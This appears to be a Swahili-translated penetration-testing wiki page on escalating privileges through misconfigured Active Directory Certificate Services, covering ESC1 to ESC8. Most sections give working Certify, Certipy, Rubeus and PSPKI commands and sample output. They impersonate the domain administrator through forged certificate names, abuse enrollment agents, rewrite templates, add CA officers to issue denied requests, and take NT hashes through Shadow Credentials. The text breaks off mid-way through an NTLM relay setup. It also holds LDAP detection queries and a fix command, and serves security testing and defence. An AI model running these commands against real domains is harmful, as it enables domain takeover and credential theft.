# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**Hii ni muhtasari wa sehemu za mbinu za kuinua viwango katika machapisho:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Ufafanuzi

### Misconfigured Certificate Templates - ESC1 Imefafanuliwa

- **Haki za enrolment zinatolewa kwa watumiaji wenye ruhusa ndogo na Enterprise CA.**
- **Idhini ya meneja haisihitajiki.**
- **Hakuna sahihi kutoka kwa watu walioidhinishwa zinazohitajika.**
- **Vibainisho vya usalama kwenye template za vyeti vimekuwa na upole mkubwa, zikiruhusu watumiaji wenye ruhusa ndogo kupata haki za enrolment.**
- **Template za vyeti zimewekwa ili zifafanue EKUs ambazo zinawezesha authentication:**
- Extended Key Usage (EKU) identifiers kama Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), au hakuna EKU (SubCA) zipo.
- **Uwezo kwa waombaji kuongeza subjectAltName katika Certificate Signing Request (CSR) unaruhusiwa na template:**
- Active Directory (AD) inapeana kipaumbele subjectAltName (SAN) katika cheti kwa ajili ya uthibitishaji ikiwa ipo. Hii inamaanisha kwamba kwa kubainisha SAN katika CSR, cheti kinaweza kuombwa kuiga mtumiaji yeyote (kwa mfano, domain administrator). Je, SAN inaweza kubainishwa na muombaji inaonyeshwa katika kitu cha template cha cheti katika AD kupitia mali `mspki-certificate-name-flag`. Mali hii ni bitmask, na uwepo wa flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` unaruhusu kubainishwa kwa SAN na muombaji.

> [!CAUTION]
> Mipangilio iliyobainishwa inaruhusu watumiaji wenye ruhusa ndogo kuomba vyeti vyenye SAN yoyote ya chaguo lao, ikiruhusu authentication kama mtu yeyote wa domain kupitia Kerberos au SChannel.

Sifa hii mara nyingine huwekwa kuwezesha uzalishaji wa haraka wa vyeti vya HTTPS au host na bidhaa au huduma za deployment, au kutokana na kutokuwa na uelewa.

Inabainika kwamba kuunda cheti kwa chaguo hili kunasababisha onyo, kinachotofautiana na wakati template ya cheti iliyopo (kama `WebServer` template, ambayo ina `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` imewezeshwa) inapodondoshwa na kisha kubadilishwa kuongeza authentication OID.

### Abuse

Ili **kutafuta template za vyeti zilizo hatarini** unaweza kuendesha:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Ili **kutumia udhaifu huu kuiga msimamizi** mtu anaweza kuendesha:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Kisha unaweza kubadilisha **cheti kilichotengenezwa kuwa `.pfx`** na kukitumia **kuthibitisha kwa kutumia Rubeus au certipy** tena:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Binary za Windows "Certreq.exe" & "Certutil.exe" zinaweza kutumika kuunda PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Uorodheshaji wa templates za vyeti ndani ya schema ya usanidi ya AD Forest, hasa zile ambazo hazihitaji idhini au signatures, zinazo EKU ya Client Authentication au Smart Card Logon, na zenye bendera `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` imewezeshwa, unaweza kufanywa kwa kuendesha query ya LDAP ifuatayo:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Templates za Cheti zilizopangwa vibaya - ESC2

### Maelezo

Tukio la pili la matumizi mabaya ni tofauti kidogo ya la kwanza:

1. Haki za usajili zinatolewa kwa watumiaji wenye vibali vidogo na Enterprise CA.
2. Uhitaji wa idhini ya meneja umezimwa.
3. Hitaji la saini zilizothibitishwa limeachwa.
4. Security descriptor yenye ukomo mdogo mno kwenye template ya cheti inawapa watumiaji wenye vibali vidogo haki za usajili wa vyeti.
5. **Template ya cheti imefafanuliwa kujumuisha Any Purpose EKU au no EKU.**

The **Any Purpose EKU** inaruhusu cheti kupatikana na mshambuliaji kwa **matumizi yoyote**, ikijumuisha uthibitishaji wa mteja (client authentication), uthibitishaji wa seva (server authentication), code signing, n.k. Teknikiki ile ile **used for ESC3** inaweza kutumika kuchochea tukio hili.

Vyeti bila **no EKUs**, ambazo hufanya kazi kama subordinate CA certificates, vinaweza kutumiwa kwa **matumizi yoyote** na pia vinaweza **kutumika kusaini vyeti vipya**. Kwa hivyo, mshambuliaji anaweza kubainisha EKUs yoyote au mashamba mengine katika vyeti vipya kwa kutumia subordinate CA certificate.

Hata hivyo, vyeti vipya vilivyoundwa kwa ajili ya **domain authentication** havitafanya kazi ikiwa subordinate CA haitegemewi na kitu cha **`NTAuthCertificates`**, jambo hili likiwa mpangilio wa chaguo-msingi. Hata hivyo, mshambuliaji bado anaweza kuunda **vyeti vipya vyenye any EKU** na thamani za cheti za ubinafsi. Hizi zinaweza kutumika vibaya kwa madhumuni mbalimbali (mfano: code signing, server authentication, n.k.) na zinaweza kuwa na athari kubwa kwa programu nyingine katika mtandao kama SAML, AD FS, au IPSec.

Ili kuorodhesha templates zinazolingana na tukio hili ndani ya schema ya usanidi ya AD Forest, query ya LDAP ifuatayo inaweza kuendeshwa:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Templates za Enrollment Agent Zilizopangwa Vibaya - ESC3

### Maelezo

Mazingira haya ni kama ya kwanza na ya pili lakini **kutumia vibaya** **EKU tofauti** (Certificate Request Agent) na **templates 2 tofauti** (hivyo ina seti 2 za mahitaji),

The **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), inayojulikana kama **Enrollment Agent** katika nyaraka za Microsoft, inaruhusu mhusika **kuomba** **cheti** kwa **niaba ya mtumiaji mwingine**.

**“enrollment agent”** hujiandikisha katika template kama hiyo na hutumia **cheti** kinachotokana ili **kusaini pamoja CSR kwa niaba ya mtumiaji mwingine**. Kisha **hutuma** **CSR iliyosainiwa pamoja** kwa CA, ikijiandikisha katika **template** inayoruhusu “kuomba kwa niaba ya mwingine”, na CA hujibu kwa **cheti kinachomilikiwa na mtumiaji “mwingine”**.

**Mahitaji 1:**

- Haki za enrollment zimetolewa kwa watumiaji wenye ruhusa za chini na Enterprise CA.
- Uthibitisho wa idhini ya meneja umeondolewa.
- Hakuna hitaji la saini zilizothibitishwa.
- Security descriptor ya template ya cheti ni mbaya sana kwa ruhusa, ikitoa haki za enrollment kwa watumiaji wenye ruhusa za chini.
- Template ya cheti ina Certificate Request Agent EKU, ikiruhusu kuomba templates nyingine za cheti kwa niaba ya wahusika wengine.

**Mahitaji 2:**

- Enterprise CA inatoa haki za enrollment kwa watumiaji wenye ruhusa za chini.
- Uthibitisho wa meneja unapitwa.
- Toleo la schema ya template ni 1 au lina zaidi ya 2, na linaonyesha Application Policy Issuance Requirement inayohitaji Certificate Request Agent EKU.
- EKU iliyotajwa katika template ya cheti inaruhusu authentication ya domain.
- Vizuizi kwa enrollment agents havijatumika kwenye CA.

### Matumizi mabaya

Unaweza kutumia [**Certify**](https://github.com/GhostPack/Certify) au [**Certipy**](https://github.com/ly4k/Certipy) kutumia vibaya mazingira haya:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
The **users** who are allowed to **obtain** an **enrollment agent certificate**, the templates in which enrollment **agents** are permitted to enroll, and the **accounts** on behalf of which the enrollment agent may act can be constrained by enterprise CAs. This is achieved by opening the `certsrc.msc` **snap-in**, **right-clicking on the CA**, **clicking Properties**, and then **navigating** to the “Enrollment Agents” tab.

Hata hivyo, inashuhudiwa kuwa mpangilio wa **default** kwa CAs ni “**Do not restrict enrollment agents**.” Wakati ukandamizo kwa enrollment agents unapoamuliwa na wasimamizi, wakibadilisha hadi “Restrict enrollment agents,” usanidi wa default unabaki kuwa unaruhusu mno. Unamruhusu **Everyone** kupata ruhusa ya kujiandikisha kwenye templates zote kama mtu yeyote.

## Udhibiti Hatarishi wa Ufikiaji wa Template ya Cheti - ESC4

### **Explanation**

The **security descriptor** on **certificate templates** defines the **permissions** specific **AD principals** possess concerning the template.

Iwapo **mshambuliaji** atakuwa na **permissions** zinazohitajika kubadilisha **template** na kuanzisha yoyote ya **exploitable misconfigurations** zilizoorodheshwa katika **prior sections**, inaweza kuwezesha privilege escalation.

Permissions muhimu zinazotumika kwa certificate templates ni pamoja na:

- **Owner:** Inampa udhibiti wa ndani juu ya object, ikiruhusu urekebishaji wa sifa yoyote.
- **FullControl:** Inaruhusu mamlaka kamili juu ya object, ikiwa ni pamoja na uwezo wa kubadilisha sifa yoyote.
- **WriteOwner:** Inaruhusu kubadilisha owner wa object kwa principal ambaye yuko chini ya udhibiti wa mshambuliaji.
- **WriteDacl:** Inaruhusu kurekebisha access controls, ambayo inaweza kumpa mshambuliaji **FullControl**.
- **WriteProperty:** Inaruhusu kuhariri sifa zozote za object.

### Abuse

Ili kubaini principals wenye haki za kuhariri kwenye templates na vitu vingine vya PKI, fanya enumeration kwa kutumia Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Mfano wa privesc kama ule uliopita:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 ni wakati mtumiaji ana write privileges juu ya certificate template. Hii, kwa mfano, inaweza kutumiwa kuandika upya usanidi wa certificate template ili kufanya template kuwa dhaifu dhidi ya ESC1.

Kama tunavyoona katika njia hapo juu, ni `JOHNPC` pekee ana haki hizi, lakini mtumiaji wetu `JOHN` ana edge mpya `AddKeyCredentialLink` kuelekea `JOHNPC`. Kwa kuwa technique hii inahusiana na certificates, nimeitumia pia shambulio hili, linalojulikana kama [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Hapa kuna kidokezo kidogo cha amri ya Certipy `shadow auto` ili kupata NT hash ya mwanaathiriwa.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** inaweza kuandika upya usanidi wa template ya cheti kwa amri moja. Kwa **chaguo-msingi**, Certipy itaandika upya usanidi ili kuufanya uwe dhaifu kwa **ESC1**. Tunaweza pia kubainisha **`-save-old` parameter ili kuhifadhi usanidi wa zamani**, ambao utakuwa muhimu kwa **kurejesha** usanidi baada ya shambulio letu.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Udhibiti wa Upatikanaji wa Vitu vya PKI Zenye Udhaifu - ESC5

### Maelezo

Mtandao mpana wa uhusiano unaotegemea ACL, unaojumuisha vitu kadhaa zaidi ya certificate templates na certificate authority, unaweza kuathiri usalama wa mfumo mzima wa AD CS. Vitu hivi, ambavyo vinaweza kuathiri kwa kiasi kikubwa usalama, vinajumuisha:

- AD computer object ya CA server, ambayo inaweza kuathiriwa kupitia mekanismu kama S4U2Self au S4U2Proxy.
- RPC/DCOM server ya CA server.
- Kila descendant AD object au container ndani ya container path maalum `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Path hii inajumuisha, lakini haizuiwi kwa, containers na vitu kama Certificate Templates container, Certification Authorities container, NTAuthCertificates object, na Enrollment Services Container.

Usalama wa mfumo wa PKI unaweza kuathiriwa ikiwa mshambuliaji mwenye vibali vidogo atafanikiwa kupata udhibiti wa mojawapo ya vipengele hivi muhimu.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Maelezo

Mada inayojadiliwa katika [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) pia inagusa athari za bendera **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, kama ilivyoelezwa na Microsoft. Mipangilio hii, inapowezeshwa kwenye Certification Authority (CA), inaruhusu ujumuishaji wa **user-defined values** katika subject alternative name kwa **maombi yoyote**, ikiwa ni pamoja na yale yaliyotengenezwa kutoka Active Directory®. Kwa hivyo, kifungu hiki kinamruhusu mdukuzi kujiandikisha kupitia template yoyote iliyowekwa kwa ajili ya domain authentication—hasa zile zinazofunguliwa kwa usajili wa watumiaji wa kawaida (unprivileged), kama User template ya kawaida. Matokeo yake, cheti kinaweza kupatikana, kumwezesha mdukuzi kuthibitisha utambulisho kama domain administrator au kitu kingine chochote kinachofanya kazi ndani ya domain.

**Kumbuka**: Mbinu ya kuongeza **alternative names** ndani ya Certificate Signing Request (CSR), kupitia hoja `-attrib "SAN:"` katika `certreq.exe` (inayojulikana kama “Name Value Pairs”), ni **tofauti** na mkakati wa kutumiwa kwa SANs katika ESC1. Hapa, tofauti iko katika **jinsi taarifa za akaunti zinavyofungwa**—ndani ya attribute ya cheti, badala ya extension.

### Matumizi mabaya

Ili kuthibitisha ikiwa mipangilio imewezeshwa, mashirika yanaweza kutumia amri ifuatayo na `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Operesheni hii hasa inatumia **remote registry access**, kwa hiyo, njia mbadala inaweza kuwa:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Zana kama [**Certify**](https://github.com/GhostPack/Certify) na [**Certipy**](https://github.com/ly4k/Certipy) zina uwezo wa kugundua usanidi mbaya huu na kuutumia:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Ili kubadilisha mipangilio hii, ikiwa mtu ana haki za **domain administrative** au sawa, amri ifuatayo inaweza kutekelezwa kutoka kwa workstation yoyote:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Ili kuzima konfigurisho hii katika mazingira yako, flag inaweza kuondolewa kwa:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Baada ya sasisho za usalama za Mei 2022, **vyeti** vipya vita kuwa na **extension ya usalama** inayoingiza **mali ya `objectSid` ya muombaji**. Kwa ESC1, SID hii inatokana na SAN iliyotajwa. Hata hivyo, kwa **ESC6**, SID inaakisi **`objectSid` ya muombaji**, si SAN.\
> Ili kukitumia ESC6, ni muhimu mfumo uwe unayoweza kuathiriwa na ESC10 (Weak Certificate Mappings), ambayo inaipa kipaumbele **SAN kuliko extension mpya ya usalama**.

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

Udhibiti wa ufikiaji wa certificate authority unadumishwa kupitia seti ya ruhusa zinazodhibiti vitendo vya CA. Ruhusa hizi zinaweza kuonekana kwa kufungua `certsrv.msc`, kubofya kwa kitufe cha kulia kwenye CA, kuchagua properties, kisha kwenda kwenye kichupo cha Security. Zaidi ya hayo, ruhusa zinaweza kuorodheshwa kwa kutumia module ya PSPKI kwa amri kama:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Hii inatoa ufahamu kuhusu haki kuu, yaani **`ManageCA`** na **`ManageCertificates`**, zinazolingana na majukumu ya “msimamizi wa CA” na “Meneja wa Vyeti” mtawalia.

#### Abuse

Kuwa na haki za **`ManageCA`** kwenye certificate authority kunamruhusu mhusika kubadilisha mipangilio kwa mbali kwa kutumia PSPKI. Hii inajumuisha kuwasha au kuzima bendera ya **`EDITF_ATTRIBUTESUBJECTALTNAME2`** ili kuruhusu utoaji wa SAN kwenye template yoyote, jambo muhimu katika domain escalation.

Kurahisisha mchakato huu kunawezekana kwa kutumia cmdlet ya PSPKI **Enable-PolicyModuleFlag**, ikiruhusu mabadiliko bila kuingiliana moja kwa moja na GUI.

Kumiliki haki za **`ManageCertificates`** kunarahisisha kuidhinishwa kwa maombi yaliyo katika kusubiri, kwa ufanisi kupita juu ya kinga ya "CA certificate manager approval".

Mchanganyiko wa moduli za **Certify** na **PSPKI** unaweza kutumika kuomba, kuidhinisha, na kupakua cheti:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Shambulio 2

#### Maelezo

> [!WARNING]
> Katika **shambulio lililopita** ruhusa za **`Manage CA`** zilitumiwa **kuwezesha** bendera **EDITF_ATTRIBUTESUBJECTALTNAME2** ili kutekeleza **ESC6 attack**, lakini hili haitaathiri hadi huduma ya CA (`CertSvc`) ianze upya. Wakati mtumiaji ana haki ya ufikiaji ya `Manage CA`, mtumiaji pia ameruhusiwa **kuanzisha upya huduma**. Hata hivyo, hii **haimaanishi kwamba mtumiaji anaweza kuanzisha upya huduma kwa mbali**. Zaidi ya hayo, E**SC6 huenda isifanyi kazi moja kwa moja** katika mazingira mengi yaliyosafishwa kutokana na masasisho ya usalama ya Mei 2022.

Kwa hivyo, shambulio lingine linaonyeshwa hapa.

Mahitaji:

- Tu **`ManageCA` permission**
- Ruhusa ya **`Manage Certificates`** (inaweza kutolewa na **`ManageCA`**)
- Templeti ya cheti **`SubCA`** lazima iwe **imewezeshwa** (inaweza kuwezeshwa na **`ManageCA`**)

Mbinu inategemea ukweli kwamba watumiaji wenye haki za ufikiaji za `Manage CA` _na_ `Manage Certificates` wanaweza **kuwasilisha maombi ya cheti yatakayokataa**. Templeti ya cheti ya **`SubCA`** ni **dhaifu dhidi ya ESC1**, lakini **wasimamizi pekee** wanaweza kujisajili kwenye templeti. Hivyo, **mtumiaji** anaweza **kuomba** kujiandikisha katika **`SubCA`** - ambalo litakataliwa - lakini **kisha litolewe na meneja baadaye**.

#### Kutumia vibaya

Unaweza **kujipa haki ya ufikiaji ya `Manage Certificates`** kwa kuongeza mtumiaji wako kama afisa mpya.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Template ya **`SubCA`** inaweza **kuwezeshwa kwenye CA** kwa kutumia parameter `-enable-template`. Kwa chaguo-msingi, template ya `SubCA` imewezeshwa.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Ikiwa tumekamilisha vigezo vya awali kwa shambulio hili, tunaweza kuanza kwa **kuomba cheti kulingana na kiolezo cha `SubCA`**.

**Ombi hili litakataa**, lakini tutahifadhi private key na kurekodi request ID.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Kwa **`Manage CA` na `Manage Certificates`**, tunaweza kisha **kutoa ombi la cheti lililoshindwa** kwa amri ya `ca` na kigezo cha `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Na hatimaye, tunaweza **kupata cheti kilichotolewa** kwa amri ya `req` na kigezo `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Shambulio 3 – Manage Certificates Extension Abuse (SetExtension)

#### Maelezo

Mbali na matumizi mabaya ya kawaida ya ESC7 (kuwezesha EDITF attributes au kuidhinisha pending requests), **Certify 2.0** iligundua primitive mpya kabisa inayohitaji tu jukumu la *Manage Certificates* (pia inajulikana kama **Certificate Manager / Officer**) kwenye Enterprise CA.

Njia ya RPC `ICertAdmin::SetExtension` inaweza kutekelezwa na yeyote anayeshikilia *Manage Certificates*. Wakati njia hiyo ilitumika jadi na CAs halali kusasisha extensions kwenye **pending** requests, mshambuliaji anaweza kuitumia vibaya kuongeza ***non-default* certificate extension** (kwa mfano custom *Certificate Issuance Policy* OID kama `1.1.1.1`) kwenye ombi linalosubiri idhini.

Kwa sababu template iliyolengwa haifafanui thamani ya default kwa extension hiyo, CA haitaboresha au kuandika juu thamani iliyowekwa na mshambuliaji wakati ombi litakapotozwa. Hivyo basi cheti kilichotolewa kina extension iliyochaguliwa na mshambuliaji ambayo inaweza:

* Kutosheleza mahitaji ya Application / Issuance Policy ya templates nyingine zilizo hatarini (kupelekea privilege escalation).
* Kuingiza EKUs au sera za ziada zinazompa cheti uaminifu usiotarajiwa katika mifumo ya wahusika wa tatu.

Kwa ufupi, *Manage Certificates* – ambayo hapo awali ilionekana kama nusu "isiyo na nguvu" ya ESC7 – sasa inaweza kutumika kwa full privilege escalation au persistence ya muda mrefu, bila kugusa usanidi wa CA au kuhitaji haki ngumu ya *Manage CA*.

#### Kutumia primitive vibaya na Certify 2.0

1. **Tuma ombi la cheti litakalobaki *pending*.** Hii inaweza kulazimishwa kwa template inayohitaji idhini ya meneja:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Ongeza extension maalum kwenye ombi lililosubiri** kwa kutumia amri mpya ya `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Ikiwa template haijatofautisha tayari *Certificate Issuance Policies* extension, thamani hapo juu itahifadhiwa baada ya utoaji.*

3. **Toa ombi** (ikiwa jukumu lako pia lina haki za kuidhinisha *Manage Certificates*) au subiri operator kuuiidhinisha. Mara utakapotoa, pakua cheti:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Cheti kilichopatikana sasa kina OID ya issuance-policy yenye madhara na kinaweza kutumika katika mashambulio yanayofuata (mfano ESC13, domain escalation, n.k.).

> KUMBUKUMBU: Shambulio sawa linaweza kutekelezwa na Certipy ≥ 4.7 kupitia amri `ca` na parameter `-set-extension`.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Maelezo

> [!TIP]
> Katika mazingira ambapo **AD CS is installed**, ikiwa kuna **web enrollment endpoint vulnerable** na angalau template moja ya cheti imetangazwa inayoruhusu **domain computer enrollment and client authentication** (kama template ya default **`Machine`**), inakuwa inawezekana kwa **kompyuta yoyote yenye spooler service active kuathiriwa na mshambuliaji**!

AD CS inasaidia njia kadhaa za **HTTP-based enrollment methods**, zinazopatikana kupitia server roles za ziada ambazo wasimamizi wanaweza kusakinisha. Interfaces hizi za HTTP-based certificate enrollment zinaweza kuathiriwa na **NTLM relay attacks**. Mshambuliaji, kutoka kwenye **compromised machine**, anaweza kuiga akaunti yoyote ya AD inayothibitishwa kupitia inbound NTLM. Wakati akiiga akaunti ya mwathiriwa, interface hizi za wavuti zinaweza kufikiwa na mshambuliaji kuomba **client authentication certificate using the `User` or `Machine` certificate templates**.

- The **web enrollment interface** (an older ASP application available at `http://<caserver>/certsrv/`), defaults to HTTP only, which does not offer protection against NTLM relay attacks. Additionally, it explicitly permits only NTLM authentication through its Authorization HTTP header, rendering more secure authentication methods like Kerberos inapplicable.
- The **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, and **Network Device Enrollment Service** (NDES) kwa default zinaunga mkono negotiate authentication kupitia Authorization HTTP header zao. Negotiate authentication inasaidia **both** Kerberos na **NTLM**, kuruhusu mshambuliaji **kudowngrade hadi NTLM** authentication wakati wa relay attacks. Ingawa huduma hizi za wavuti zinaweza kuweka HTTPS kwa default, HTTPS pekee **haitalinda dhidi ya NTLM relay attacks**. Ulinzi dhidi ya NTLM relay attacks kwa huduma za HTTPS unapatikana tu pale HTTPS inapotumika pamoja na channel binding. Kwa bahati mbaya, AD CS haizimei Extended Protection for Authentication kwenye IIS, ambayo inahitajika kwa channel binding.

Tatizo la kawaida kwa NTLM relay attacks ni **muda mfupi wa vikao vya NTLM** na kushindwa kwa mshambuliaji kuingiliana na huduma zinazohitaji **NTLM signing**.

Hata hivyo, kikomo hiki kinaweza kushindwa kwa kutumia NTLM relay attack kupata cheti kwa mtumiaji, kwa kuwa muda wa uhalali wa cheti ndio unaodhibiti muda wa kikao, na cheti kinaweza kutumika na huduma zinazolazimisha **NTLM signing**. Kwa maagizo ya kutumia cheti kilichoibiwa, rejea:


{{#ref}}
account-persistence.md
{{#endref}}

Kikomo kingine cha NTLM relay attacks ni kwamba **kompyuta inayodhibitiwa na mshambuliaji lazima ithibitishwe na akaunti ya mwathiriwa**. Mshambuliaji anaweza kusubiri au kujaribu **kulazimisha** uthibitishaji huu:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Matumizi mabaya**

Amri `cas` ya [**Certify**](https://github.com/GhostPack/Certify) inoorodhesha **enabled HTTP AD CS endpoints**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Mali `msPKI-Enrollment-Servers` hutumika na Mamlaka za Vyeti za kibiashara (CAs) kuhifadhi endpoints za Certificate Enrollment Service (CES). Endpoints hizi zinaweza kuchambuliwa na kutolewa orodha kwa kutumia chombo **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Matumizi mabaya ya Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
